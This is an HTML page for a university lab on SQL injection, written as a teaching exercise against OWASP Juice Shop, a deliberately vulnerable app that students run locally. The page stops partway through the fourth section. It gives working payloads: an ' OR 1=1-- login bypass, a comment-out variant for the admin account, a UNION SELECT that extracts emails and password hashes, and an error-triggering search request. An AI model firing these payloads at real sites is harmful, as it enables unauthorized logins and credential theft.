@@ -1,0 +1,1078 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab 03: SQL Injection — CCY4202</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../assets/css/base.css" />
+  <link rel="stylesheet" href="../assets/css/layout.css" />
+  <link rel="stylesheet" href="../assets/css/components.css" />
+</head>
+<body data-nav-active="labs" data-active-lab="lab03" data-projector-qr>
+  <div data-site-nav></div>
+
+  <div class="page-wrapper">
+    <aside class="sidebar" id="site-sidebar">
+      <div class="sidebar__header">
+        <div class="sidebar__title">Course Modules</div>
+      </div>
+      <div id="sidebar-module-tree"></div>
+    </aside>
+    <div class="sidebar-backdrop"></div>
+
+    <main class="main-content">
+      <nav class="breadcrumbs" aria-label="Breadcrumb">
+        <a href="../index.html">Home</a>
+        <span class="breadcrumbs__separator">/</span>
+        <a href="../index.html">Labs</a>
+        <span class="breadcrumbs__separator">/</span>
+        <span>Module 01</span>
+        <span class="breadcrumbs__separator">/</span>
+        <span>Lab 03</span>
+      </nav>
+
+      <header class="lab-header">
+        <div class="lab-header__meta">
+          <span class="lab-badge lab-badge--time">⏱️ 60 Mins</span>
+          <span class="lab-badge lab-badge--difficulty">Intermediate</span>
+        </div>
+        <h1 class="lab-header__title">Lab 03: SQL Injection</h1>
+        <p class="lab-header__lead">
+          Last week you learned to put anything you want on the wire. Today you send the one thing the developer really didn't want: database logic. You'll walk into an admin account with no password, make the app leak its own query, then pull the whole user table out through the search bar.
+        </p>
+        <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin-top:var(--space-2);font-family:var(--font-mono);">
+          👯 <strong>Pair up.</strong> One person types, the other reads the steps out loud. Swap every 15 min.
+        </p>
+      </header>
+
+      <!-- Career band (v2): where this sits in the real world -->
+      <div class="info-dense-card info-dense-card--accent" style="margin-bottom:var(--space-4);">
+        <div class="info-dense-card__title">📌 Where this lands in the real world</div>
+        <div class="info-dense-card__grid">
+          <div class="info-dense-card__cell">
+            <span class="info-dense-card__label">OWASP Top 10</span>
+            <code>A03: Injection</code>
+          </div>
+          <div class="info-dense-card__cell">
+            <span class="info-dense-card__label">MITRE ATT&amp;CK</span>
+            <code>T1190</code>
+          </div>
+          <div class="info-dense-card__cell">
+            <span class="info-dense-card__label">CEH domain</span>
+            <code>Web App Hacking</code>
+          </div>
+          <div class="info-dense-card__cell">
+            <span class="info-dense-card__label">Builds toward</span>
+            <code>eJPT · BSCP</code>
+          </div>
+        </div>
+      </div>
+
+      <!-- Section 0.5: Skip & Navigate + Methodology Spine -->
+      <section>
+        <h2 id="skip-and-navigate">0. Where We Are, and the Process We Follow</h2>
+
+        <div class="callout callout--theory">
+          <span class="callout__icon">🧭</span>
+          <div class="callout__content">
+            <div class="callout__title">Still in Phase 3 (Exploitation), now going deeper</div>
+            <p style="margin:0;">
+              Last week you learned the tools. This week you use them on your first real vulnerability class. From here on, every web lab follows the same five-step process so it turns into a habit, not a one-off trick.
+            </p>
+          </div>
+        </div>
+
+        <div class="diagram-card" style="margin-top:var(--space-3);">
+          <div class="diagram-card__title">
+            <span>THE WEB PENTEST SPINE · same five steps every lab</span>
+            <span style="color:var(--color-accent);">Today lives in Identify → Exploit → Document</span>
+          </div>
+          <svg class="diagram-svg" viewBox="0 0 940 120" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Five-step web pentest methodology: Recon, Map, Identify, Exploit, Document">
+            <defs>
+              <marker id="arrow-spine" viewBox="0 0 10 10" refX="6" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                <path d="M 0 1 L 8 5 L 0 9 z" fill="var(--color-accent)" />
+              </marker>
+            </defs>
+            <g opacity="0.4">
+              <rect x="5" y="35" width="160" height="52" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-border)" stroke-width="1.5" />
+              <text x="85" y="58" fill="var(--color-cyan)" font-family="var(--font-mono)" font-size="11" font-weight="700" text-anchor="middle">1 · RECON</text>
+              <text x="85" y="76" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="9" text-anchor="middle">who is the target</text>
+            </g>
+            <path d="M 165 61 L 190 61" stroke="var(--color-accent)" stroke-width="2" opacity="0.4" marker-end="url(#arrow-spine)" />
+            <g opacity="0.4">
+              <rect x="195" y="35" width="160" height="52" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-border)" stroke-width="1.5" />
+              <text x="275" y="58" fill="var(--color-cyan)" font-family="var(--font-mono)" font-size="11" font-weight="700" text-anchor="middle">2 · MAP</text>
+              <text x="275" y="76" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="9" text-anchor="middle">every feature (Lab 02)</text>
+            </g>
+            <path d="M 355 61 L 380 61" stroke="var(--color-accent)" stroke-width="2" marker-end="url(#arrow-spine)" />
+            <g>
+              <rect x="385" y="28" width="170" height="66" rx="8" fill="var(--color-warn-soft)" stroke="var(--color-warn)" stroke-width="2.5" />
+              <text x="470" y="52" fill="var(--color-warn)" font-family="var(--font-mono)" font-size="11" font-weight="800" text-anchor="middle">3 · IDENTIFY</text>
+              <text x="470" y="70" fill="var(--color-text-primary)" font-family="var(--font-sans)" font-size="11" font-weight="700" text-anchor="middle">find the injection</text>
+              <text x="470" y="86" fill="var(--color-warn)" font-family="var(--font-mono)" font-size="9" text-anchor="middle">TODAY</text>
+            </g>
+            <path d="M 555 61 L 580 61" stroke="var(--color-accent)" stroke-width="2" marker-end="url(#arrow-spine)" />
+            <g>
+              <rect x="585" y="28" width="170" height="66" rx="8" fill="var(--color-warn-soft)" stroke="var(--color-warn)" stroke-width="2.5" />
+              <text x="670" y="52" fill="var(--color-warn)" font-family="var(--font-mono)" font-size="11" font-weight="800" text-anchor="middle">4 · EXPLOIT</text>
+              <text x="670" y="70" fill="var(--color-text-primary)" font-family="var(--font-sans)" font-size="11" font-weight="700" text-anchor="middle">bypass · dump</text>
+              <text x="670" y="86" fill="var(--color-warn)" font-family="var(--font-mono)" font-size="9" text-anchor="middle">TODAY</text>
+            </g>
+            <path d="M 755 61 L 780 61" stroke="var(--color-accent)" stroke-width="2" marker-end="url(#arrow-spine)" />
+            <g>
+              <rect x="785" y="28" width="150" height="66" rx="8" fill="var(--color-accent-soft)" stroke="var(--color-accent)" stroke-width="2.5" />
+              <text x="860" y="52" fill="var(--color-accent)" font-family="var(--font-mono)" font-size="11" font-weight="800" text-anchor="middle">5 · DOCUMENT</text>
+              <text x="860" y="70" fill="var(--color-text-primary)" font-family="var(--font-sans)" font-size="11" font-weight="700" text-anchor="middle">write the finding</text>
+              <text x="860" y="86" fill="var(--color-accent)" font-family="var(--font-mono)" font-size="9" text-anchor="middle">TODAY</text>
+            </g>
+          </svg>
+        </div>
+
+        <div class="callout callout--tip" style="margin-top:var(--space-3);">
+          <span class="callout__icon">🎚️</span>
+          <div class="callout__content">
+            <div class="callout__title">Three tiers today. Pick your line.</div>
+            <p style="margin:0;font-size:var(--font-size-sm);">
+              🟢 <strong>Baseline</strong> is the guided win. Everyone finishes it. 🟡 <strong>Stretch</strong> takes the training wheels off. 🔴 <strong>Going Pro</strong> is career-grade depth for anyone flying. If Baseline feels easy, skip ahead. Nobody's stuck waiting.
+            </p>
+          </div>
+        </div>
+
+        <!-- Tool-agnostic spine: same attack, two tools, two reasons -->
+        <div class="diagram-card" style="margin-top:var(--space-3);">
+          <div class="diagram-card__title">
+            <span>🧰 ONE ATTACK, TWO TOOLS · the point is the attack, not the tool</span>
+            <span style="color:var(--color-accent);">DevTools → Burp</span>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:var(--space-2) var(--space-3) var(--space-3);">
+            SQL injection isn't a Burp feature. It's text on the wire. We'll start in the browser's own DevTools (no install) to prove that, then move to Burp only when the job actually calls for it. Pick the tool the job needs, not the one you're used to.
+          </p>
+          <div class="comparison-grid" style="margin:0;">
+            <div class="comparison-card comparison-card--cyan">
+              <div class="comparison-card__header">
+                <h3 class="comparison-card__title">1 · DevTools</h3>
+                <span class="comparison-badge" style="color:var(--color-cyan);">already in your browser</span>
+              </div>
+              <ul class="comparison-list">
+                <li><span class="comparison-icon">🎯</span> Jobs: the login bypass, then break the search and read the leaked error.</li>
+                <li><span class="comparison-icon">💡</span> Every browser ships a free proxy. Zero install, and you watch the real request leave.</li>
+              </ul>
+            </div>
+            <div class="comparison-card comparison-card--accent">
+              <div class="comparison-card__header">
+                <h3 class="comparison-card__title">2 · Burp</h3>
+                <span class="comparison-badge" style="color:var(--color-accent);">built to iterate</span>
+              </div>
+              <ul class="comparison-list">
+                <li><span class="comparison-icon">🎯</span> Job: count columns, then dump the table.</li>
+                <li><span class="comparison-icon">💡</span> When you send one request 10 times with one number changed, this is why Burp exists.</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 1: SQL refresher -->
+      <section>
+        <h2 id="sql-in-5-minutes">1. SQL in Five Minutes <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· foundation</span></h2>
+        <p class="lab-lead">
+          A database is a stack of tables. A table is rows and columns, like a spreadsheet. You talk to it with SQL, and 90% of what an attacker needs is one sentence: <code>SELECT columns FROM table WHERE condition</code>.
+        </p>
+
+        <div class="diagram-card">
+          <div class="diagram-card__title">
+            <span>🗄️ TABLE: students</span>
+            <span style="color:var(--color-cyan);">rows × columns</span>
+          </div>
+          <svg class="diagram-svg" viewBox="0 0 720 234" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="A students table with columns id, name, major, gpa">
+            <!-- header row -->
+            <rect x="20" y="20" width="90" height="34" fill="var(--color-surface)" stroke="var(--color-border)" />
+            <rect x="110" y="20" width="260" height="34" fill="var(--color-surface)" stroke="var(--color-border)" />
+            <rect x="370" y="20" width="240" height="34" fill="var(--color-surface)" stroke="var(--color-border)" />
+            <rect x="610" y="20" width="90" height="34" fill="var(--color-surface)" stroke="var(--color-border)" />
+            <text x="65" y="42" fill="var(--color-cyan)" font-family="var(--font-mono)" font-size="12" font-weight="700" text-anchor="middle">id</text>
+            <text x="240" y="42" fill="var(--color-cyan)" font-family="var(--font-mono)" font-size="12" font-weight="700" text-anchor="middle">name</text>
+            <text x="490" y="42" fill="var(--color-cyan)" font-family="var(--font-mono)" font-size="12" font-weight="700" text-anchor="middle">major</text>
+            <text x="655" y="42" fill="var(--color-cyan)" font-family="var(--font-mono)" font-size="12" font-weight="700" text-anchor="middle">gpa</text>
+            <!-- row 1 -->
+            <rect x="20" y="54" width="90" height="34" fill="var(--color-bg-alt)" stroke="var(--color-border)" />
+            <rect x="110" y="54" width="260" height="34" fill="var(--color-bg-alt)" stroke="var(--color-border)" />
+            <rect x="370" y="54" width="240" height="34" fill="var(--color-bg-alt)" stroke="var(--color-border)" />
+            <rect x="610" y="54" width="90" height="34" fill="var(--color-bg-alt)" stroke="var(--color-border)" />
+            <text x="65" y="76" fill="var(--color-text-primary)" font-family="var(--font-mono)" font-size="11" text-anchor="middle">1</text>
+            <text x="240" y="76" fill="var(--color-text-primary)" font-family="var(--font-mono)" font-size="11" text-anchor="middle">Mariam Adel</text>
+            <text x="490" y="76" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="11" text-anchor="middle">Computer Science</text>
+            <text x="655" y="76" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="11" text-anchor="middle">3.60</text>
+            <!-- row 2 (highlighted middle row) -->
+            <rect x="20" y="88" width="90" height="34" fill="var(--color-accent-soft)" stroke="var(--color-accent)" />
+            <rect x="110" y="88" width="260" height="34" fill="var(--color-accent-soft)" stroke="var(--color-accent)" />
+            <rect x="370" y="88" width="240" height="34" fill="var(--color-accent-soft)" stroke="var(--color-accent)" />
+            <rect x="610" y="88" width="90" height="34" fill="var(--color-accent-soft)" stroke="var(--color-accent)" />
+            <text x="65" y="110" fill="var(--color-text-primary)" font-family="var(--font-mono)" font-size="11" text-anchor="middle">2</text>
+            <text x="240" y="110" fill="var(--color-text-primary)" font-family="var(--font-mono)" font-size="11" text-anchor="middle">Youssef Hany</text>
+            <text x="490" y="110" fill="var(--color-text-primary)" font-family="var(--font-mono)" font-size="11" text-anchor="middle">Information Systems</text>
+            <text x="655" y="110" fill="var(--color-text-primary)" font-family="var(--font-mono)" font-size="11" text-anchor="middle">3.10</text>
+            <!-- row 3 -->
+            <rect x="20" y="122" width="90" height="34" fill="var(--color-bg-alt)" stroke="var(--color-border)" />
+            <rect x="110" y="122" width="260" height="34" fill="var(--color-bg-alt)" stroke="var(--color-border)" />
+            <rect x="370" y="122" width="240" height="34" fill="var(--color-bg-alt)" stroke="var(--color-border)" />
+            <rect x="610" y="122" width="90" height="34" fill="var(--color-bg-alt)" stroke="var(--color-border)" />
+            <text x="65" y="144" fill="var(--color-text-primary)" font-family="var(--font-mono)" font-size="11" text-anchor="middle">3</text>
+            <text x="240" y="144" fill="var(--color-text-primary)" font-family="var(--font-mono)" font-size="11" text-anchor="middle">Salma Tarek</text>
+            <text x="490" y="144" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="11" text-anchor="middle">Computer Science</text>
+            <text x="655" y="144" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="11" text-anchor="middle">3.90</text>
+            <!-- WHERE pointer -->
+            <text x="20" y="188" fill="var(--color-warn)" font-family="var(--font-mono)" font-size="12" font-weight="700">SELECT * FROM students WHERE id = 2;</text>
+            <text x="20" y="210" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="10">→ returns the highlighted row. Drop the WHERE and you get every row.</text>
+          </svg>
+        </div>
+
+        <div class="info-dense-card info-dense-card--cyan" style="margin-top:var(--space-3);">
+          <div class="info-dense-card__title">The only SQL you need today</div>
+          <div class="info-dense-card__grid">
+            <div class="info-dense-card__cell">
+              <span class="info-dense-card__label">Pick rows</span>
+              <code>SELECT * FROM users</code>
+            </div>
+            <div class="info-dense-card__cell">
+              <span class="info-dense-card__label">Filter</span>
+              <code>WHERE email = 'a@b.com'</code>
+            </div>
+            <div class="info-dense-card__cell">
+              <span class="info-dense-card__label">Always true</span>
+              <code>OR 1=1</code>
+            </div>
+            <div class="info-dense-card__cell">
+              <span class="info-dense-card__label">Ignore the rest of the line</span>
+              <code>--</code>
+            </div>
+            <div class="info-dense-card__cell">
+              <span class="info-dense-card__label">Glue a second query on</span>
+              <code>UNION SELECT …</code>
+            </div>
+            <div class="info-dense-card__cell">
+              <span class="info-dense-card__label">A quote ends a string</span>
+              <code>'</code>
+            </div>
+          </div>
+        </div>
+
+        <!-- UNION refresher: below the SELECT basics, built roomy for readability -->
+        <h3 id="union-refresher" style="margin-top:var(--space-5);">Now meet <code>UNION</code>, the one you'll lean on later</h3>
+        <p class="lab-lead" style="margin-bottom:var(--space-4);">
+          <code>UNION</code> takes a second <code>SELECT</code> and stacks its rows right under the first, so one request hands you both. Later today that's how you make a product search cough up the <em>users</em> table. Read it slowly, it's the engine of §5.
+        </p>
+
+        <div class="comparison-grid" style="margin-bottom:var(--space-4);">
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">Query A · what the app already runs</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);">3 columns</span>
+            </div>
+            <div class="terminal-window" style="margin:0 0 var(--space-3);">
+              <div class="terminal-window__body"><pre><code>SELECT id, name, major
+FROM students</code></pre></div>
+            </div>
+            <div class="table-container">
+              <table class="data-table">
+                <thead><tr><th>id</th><th>name</th><th>major</th></tr></thead>
+                <tbody>
+                  <tr><td>1</td><td>Mariam</td><td>CS</td></tr>
+                  <tr><td>2</td><td>Youssef</td><td>IS</td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">Query B · what you bolt on</h3>
+              <span class="comparison-badge" style="color:var(--color-accent);">3 columns</span>
+            </div>
+            <div class="terminal-window" style="margin:0 0 var(--space-3);">
+              <div class="terminal-window__body"><pre><code>UNION SELECT 'x', email, password
+FROM users</code></pre></div>
+            </div>
+            <div class="table-container">
+              <table class="data-table">
+                <thead><tr><th>col 1</th><th>col 2</th><th>col 3</th></tr></thead>
+                <tbody>
+                  <tr><td>x</td><td>admin@juice-sh.op</td><td>0192023a…</td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        <div class="diagram-card" style="margin-bottom:var(--space-4);">
+          <div class="diagram-card__title">
+            <span>⬇️ Both have 3 columns, so they stack into one result</span>
+            <span style="color:var(--color-accent);">A + B</span>
+          </div>
+          <div class="table-container" style="padding:var(--space-3);">
+            <table class="data-table">
+              <thead><tr><th>id</th><th>name</th><th>major</th></tr></thead>
+              <tbody>
+                <tr><td>1</td><td>Mariam</td><td>CS</td></tr>
+                <tr><td>2</td><td>Youssef</td><td>IS</td></tr>
+                <tr style="background:var(--color-accent-soft);">
+                  <td style="color:var(--color-accent);font-weight:700;">x</td>
+                  <td style="color:var(--color-accent);font-weight:700;">admin@juice-sh.op</td>
+                  <td style="color:var(--color-accent);font-weight:700;">0192023a…</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:var(--space-3) var(--space-3) 0;">
+            The highlighted row isn't a student. It's a user record riding back in the students' clothes. Swap <code>students</code> for a product search and <code>users</code> for the real table, and that's the §5 attack exactly.
+          </p>
+        </div>
+
+        <div class="comparison-grid">
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">✅ Rule 1 · column counts must match</h3>
+            </div>
+            <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0;">
+              Both <code>SELECT</code>s have to return the <strong>same number of columns</strong>, or the database refuses the whole query and you get nothing. That's the entire reason you count columns before you extract.
+            </p>
+          </div>
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">✅ Rule 2 · types have to be compatible</h3>
+            </div>
+            <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0 0 var(--space-2);">
+              Column 2 meets column 2, column 3 meets column 3, and each pair has to be type-compatible. Strict databases (Postgres, SQL Server) reject a string stacked on a number. <strong>SQLite, which Juice Shop uses, is loose</strong> about it, which is exactly why a string email can ride back in the integer <code>id</code> column.
+            </p>
+            <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:0;">
+              Don't know the types? Use <code>NULL</code> as the placeholder, it's compatible with every type, so <code>UNION SELECT NULL,NULL,NULL--</code> finds the column count without a type error. Then swap a string into each slot to see which ones print.
+            </p>
+          </div>
+        </div>
+
+      </section>
+
+      <!-- Section 2: Exploit first, the auth bypass -->
+      <section>
+        <h2 id="auth-bypass">2. Walk In Without a Password <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· exploit · tool 1: browser + DevTools</span></h2>
+
+        <div class="target-launcher" data-target-slug="juice-shop">
+          <div class="target-launcher__header">
+            <div class="target-launcher__title-group">
+              <span class="target-launcher__icon">🧃</span>
+              <div>
+                <h3 class="target-launcher__title">OWASP Juice Shop</h3>
+                <div class="target-launcher__platform">Node · Angular SPA · same container as last week</div>
+              </div>
+            </div>
+            <span class="target-launcher__badge">🎯 Launch Target</span>
+          </div>
+          <div class="target-launcher__body">
+            <div class="target-launcher__step">
+              <span class="target-launcher__step-label">🖐️ DO #1 · Start it (skip if it's still running)</span>
+              <div class="terminal-window" style="margin:0;">
+                <div class="terminal-window__header">
+                  <div class="terminal-window__controls">
+                    <span class="terminal-dot terminal-dot--red"></span>
+                    <span class="terminal-dot terminal-dot--yellow"></span>
+                    <span class="terminal-dot terminal-dot--green"></span>
+                  </div>
+                  <span class="terminal-window__title">bash · start Juice Shop</span>
+                  <button type="button" class="terminal-copy-btn">Copy</button>
+                </div>
+                <div class="terminal-window__body">
+                  <pre><code>docker run --rm -d --name juice -p 3000:3000 bkimminich/juice-shop</code></pre>
+                </div>
+              </div>
+            </div>
+            <div class="target-launcher__step">
+              <span class="target-launcher__step-label">Open it in the browser (that's our workbench today)</span>
+              <a class="target-launcher__url" href="http://localhost:3000" target="_blank" rel="noopener">http://localhost:3000</a>
+            </div>
+          </div>
+          <div class="target-launcher__footer">
+            <span>Image: <code>bkimminich/juice-shop</code> · runs offline once pulled</span>
+            <a class="target-launcher__catalog-link" href="../tools.html#juice-shop">→ setup card</a>
+          </div>
+        </div>
+
+        <div class="bento-card" style="margin:var(--space-4) 0;">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
+            <strong style="color:var(--color-accent);font-family:var(--font-mono);font-size:var(--font-size-sm);">🖐️ DO #2 · The login bypass, right in the form</strong>
+            <span class="comparison-badge" style="color:var(--color-accent);">5 min</span>
+          </div>
+          <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:0 0 var(--space-3);display:flex;flex-direction:column;gap:var(--space-1);">
+            <li>Juice Shop → top-right <strong>Account → Login</strong>.</li>
+            <li>In the <strong>Email</strong> field type <code>' OR 1=1--</code></li>
+            <li>Put anything in <strong>Password</strong>. It won't be checked, your payload deletes the password check before the database ever reads it.</li>
+            <li>Click <strong>Log in</strong>. You're in, and the top bar shows you're the administrator.</li>
+          </ol>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0 0 var(--space-1);">
+            <strong>Peek under the hood:</strong> press <kbd>F12</kbd> → <strong>Network</strong> tab, then log in again. You'll see a <code>POST /rest/user/login</code> go out with your payload sitting in the JSON body, and a <code>200</code> come back carrying a <code>token</code> (a JWT) and <code>"email":"admin@juice-sh.op"</code>. That token <em>is</em> the admin session. The form just typed the request for you.
+          </p>
+          <details class="thought-accordion" style="margin-top:var(--space-2);">
+            <summary>Got a 401 / "Invalid email or password"?</summary>
+            <div class="thought-accordion__content">
+              <p style="margin:0;">Swap the email for a named user: <code>admin@juice-sh.op'--</code>. That closes the string and comments out the password check for one known account. If it still fails, your Juice Shop version may want a trailing space after <code>--</code> (<code>' OR 1=1-- </code>). Open the <code>login</code> request in the Network tab and read the response body, it usually tells you what it rejected.</p>
+            </div>
+          </details>
+        </div>
+
+        <!-- Discovery Prompt: let them reason out WHY admin -->
+        <div class="prediction-prompt" style="margin-top:var(--space-4);">
+          <div class="prediction-prompt__question">🤔 You're logged in as the <strong>admin</strong> now. But you never typed the word "admin" anywhere, and there are a dozen users in that table. So why did the app hand you the admin account and not some random customer? Write your best guess before you reveal.</div>
+          <div class="prediction-prompt__input-group">
+            <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
+            <button type="button" class="prediction-prompt__btn">Reveal</button>
+          </div>
+          <div class="prediction-prompt__reveal" hidden>
+            <span class="prediction-prompt__reveal-label">Answer</span>
+            Your payload made the filter always true, so the query returned <strong>every user row</strong>. But the login code only ever looks at the <strong>first row</strong> it gets back. In Juice Shop, the first row is the admin. You didn't choose who to become, the row order did, and it happened to hand you the keys to the whole shop.
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 3: Now explain WHY it worked -->
+      <section>
+        <h2 id="how-the-query-is-built">3. Why That Worked <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· identify</span></h2>
+        <p class="lab-lead">
+          Here's what actually happened under the hood. The app took your email and password and pasted them straight into a SQL sentence, then ran it. Because it glues strings together without cleaning your input, you got to finish the sentence for it.
+        </p>
+
+        <div class="comparison-grid" style="margin-bottom:var(--space-4);">
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">✅ What the developer meant</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);">normal login</span>
+            </div>
+            <ul class="comparison-list">
+              <li><span class="comparison-icon">📝</span> You type: <code>jim@juice-sh.op</code> / <code>hunter2</code></li>
+              <li><span class="comparison-icon">⚙️</span> Query becomes:<br /><code>SELECT * FROM users WHERE email='jim@juice-sh.op' AND password='hunter2'</code></li>
+              <li><span class="comparison-icon">🔒</span> No match unless both are right. Login denied.</li>
+            </ul>
+          </div>
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">💥 What you sent instead</h3>
+              <span class="comparison-badge" style="color:var(--color-accent);">injected</span>
+            </div>
+            <ul class="comparison-list">
+              <li><span class="comparison-icon">📝</span> Email field: <code>' OR 1=1--</code></li>
+              <li><span class="comparison-icon">⚙️</span> Query becomes:<br /><code>SELECT * FROM users WHERE email='' OR 1=1--' AND password='…'</code></li>
+              <li><span class="comparison-icon">🔓</span> <code>1=1</code> is always true, <code>--</code> comments out the password check. Returns every row, and the app logs you in as row one.</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="diagram-card">
+          <div class="diagram-card__title">
+            <span>🎯 THE INJECTION POINT · your quote breaks out of the string</span>
+          </div>
+          <svg class="diagram-svg" viewBox="0 0 760 150" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Diagram showing the injected quote closing the string and the comment removing the rest">
+            <text x="20" y="40" font-family="var(--font-mono)" font-size="13" fill="var(--color-text-secondary)">... WHERE email='</text>
+            <rect x="185" y="24" width="118" height="24" rx="4" fill="var(--color-accent-soft)" stroke="var(--color-accent)" stroke-width="1.5" />
+            <text x="244" y="41" font-family="var(--font-mono)" font-size="13" fill="var(--color-accent)" font-weight="700" text-anchor="middle">' OR 1=1--</text>
+            <text x="310" y="40" font-family="var(--font-mono)" font-size="13" fill="var(--color-text-muted)" text-decoration="line-through">' AND password='...'</text>
+            <text x="20" y="80" font-family="var(--font-mono)" font-size="11" fill="var(--color-accent)">↑ your first quote closes the email string</text>
+            <text x="310" y="70" font-family="var(--font-mono)" font-size="11" fill="var(--color-danger)" text-anchor="start">↑ everything after -- is a comment, ignored</text>
+            <line x1="20" y1="105" x2="740" y2="105" stroke="var(--color-border)" stroke-width="1" />
+            <text x="20" y="132" font-family="var(--font-mono)" font-size="12" fill="var(--color-warn)" font-weight="700">Net result: WHERE email='' OR 1=1   →   always true   →   all rows returned</text>
+          </svg>
+        </div>
+      </section>
+
+      <!-- Section 4: Stretch, error-based -->
+      <section>
+        <h2 id="read-the-error">4. Make the App Confess <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· identify · still in DevTools</span></h2>
+
+        <div class="bento-card" style="margin:var(--space-4) 0;">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
+            <strong style="color:var(--color-warn);font-family:var(--font-mono);font-size:var(--font-size-sm);">🖐️ DO #3 · Break the search, watch it in DevTools</strong>
+            <span class="comparison-badge" style="color:var(--color-warn);">4 min</span>
+          </div>
+          <div class="callout callout--warning" style="margin-bottom:var(--space-3);">
+            <span class="callout__icon">⚠️</span>
+            <div class="callout__content">
+              <div class="callout__title">The magnifier box won't inject, hit the API instead</div>
+              <p style="margin:0;font-size:var(--font-size-sm);">
+                Type <code>')</code> into the shop's search box and watch the Network tab: the request that actually goes out is <code>GET /rest/products/search?q=</code> with an <strong>empty</strong> <code>q</code>. Your payload never reaches the database query, so nothing breaks. To probe the real query you call that search <strong>API endpoint directly</strong> in the address bar and put the payload in <code>q</code> yourself. That's also exactly how you'd test for real.
+              </p>
+            </div>
+          </div>
+          <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:0 0 var(--space-2);display:flex;flex-direction:column;gap:var(--space-1);">
+            <li>Press <kbd>F12</kbd> (or right-click → Inspect) and click the <strong>Network</strong> tab. Tick <strong>Preserve log</strong> so nothing scrolls away.</li>
+            <li>In the <strong>address bar</strong>, go to <code>http://localhost:3000/rest/products/search?q=apple</code>. The browser shows the raw JSON product list, and a <code>search?q=apple</code> row appears in Network with status <code>200</code>. That's the real API the search box was supposed to call.</li>
+            <li>Change the URL to <code>…?q='</code> (a lone quote). Still <code>200</code>, but empty, a single quote isn't enough to break this one.</li>
+            <li>Now try <code>…?q=')</code>. The page flips to an ugly error, and the Network row shows <code>500</code>. The extra <code>)</code> is what breaks the query for real.</li>
+          </ol>
+          <div class="terminal-window" style="margin:var(--space-2) 0 0;">
+            <div class="terminal-window__header">
+              <div class="terminal-window__controls">
+                <span class="terminal-dot terminal-dot--red"></span>
+                <span class="terminal-dot terminal-dot--yellow"></span>
+                <span class="terminal-dot terminal-dot--green"></span>
+              </div>
+              <span class="terminal-window__title">DevTools · Network → Response for q=')</span>
+            </div>
+            <div class="terminal-window__body">
+<pre><code>HTTP/1.1 500 Internal Server Error
+
+&lt;title&gt;Error: SQLITE_ERROR: near ")": syntax error&lt;/title&gt;
+...
+OWASP Juice Shop (Express ^4.22.1)
+500 Error: SQLITE_ERROR: near ")": syntax error
+  #stacktrace ...</code></pre>
+            </div>
+          </div>
+          <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:var(--space-2) 0 0;font-family:var(--font-mono);">
+            One broken request just leaked the database engine (SQLite), the framework and version (Express 4), and a stack trace. Real apps should return a boring generic 500.
+          </p>
+        </div>
+
+        <div class="callout callout--tip">
+          <span class="callout__icon">🔎</span>
+          <div class="callout__content">
+            <div class="callout__title">What the error just told you</div>
+            <p style="margin:0;font-size:var(--font-size-sm);">
